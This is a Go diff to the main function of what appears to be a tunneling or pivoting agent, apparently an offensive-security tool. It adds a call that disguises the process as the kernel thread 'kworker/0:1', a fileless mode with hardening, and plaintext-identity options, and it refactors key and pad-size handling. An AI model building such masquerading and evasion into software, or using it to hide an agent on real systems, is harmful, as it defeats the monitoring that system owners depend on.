@@ -24,11 +24,20 @@ func init() {
 func main() {
 	utils.DisableCoreDump()
 	options := initial.ParseOptions()
+	utils.MaskProcessName("kworker/0:1")
 	if !options.Verbose {
 		log.SetOutput(io.Discard)
 	}
 
+	if options.Fileless {
+		identity.SetFilelessMode(true)
+		identity.SetAllowPlaintextIdentity(true)
+		utils.FilelessHarden()
+	} else if options.IdentityPlain {
+		identity.SetAllowPlaintextIdentity(true)
+	}
 	share.GeneratePreAuthToken(options.Secret)
+	share.InitGreetings(options.Secret)
 	if len(options.Secret) > 0 {
 		identity.SetStorageSecret(options.Secret)
 	}
@@ -84,7 +93,9 @@ func main() {
 	agent := process.NewAgent(options)
 
 	if options.PadSize > 0 {
-		protocol.SetPadSize(options.PadSize)
+		if err := protocol.SetPadSize(options.PadSize); err != nil {
+			log.Fatalf("[*] Invalid pad size: %s\n", err.Error())
+		}
 	}
 	if options.UserAgent != "" {
 		protocol.SetUserAgents(strings.Split(options.UserAgent, "|"))
@@ -141,8 +152,8 @@ func main() {
 	share.ClearPreAuthToken()
 
 	global.InitialGComponent(conn, cryptoKey, agent.UUID)
-	global.Session.LinkKey = linkKey
-	_ = utils.MlockBytes(global.Session.LinkKey)
+	global.Session.SetLinkKey(linkKey)
+	_ = utils.MlockBytes(global.Session.GetLinkKey())
 	global.Session.TLSEnable = options.TlsEnable
 	global.Session.TLSFingerprint = options.TlsFingerprint
 	global.Session.TLSInsecure = options.TlsInsecure
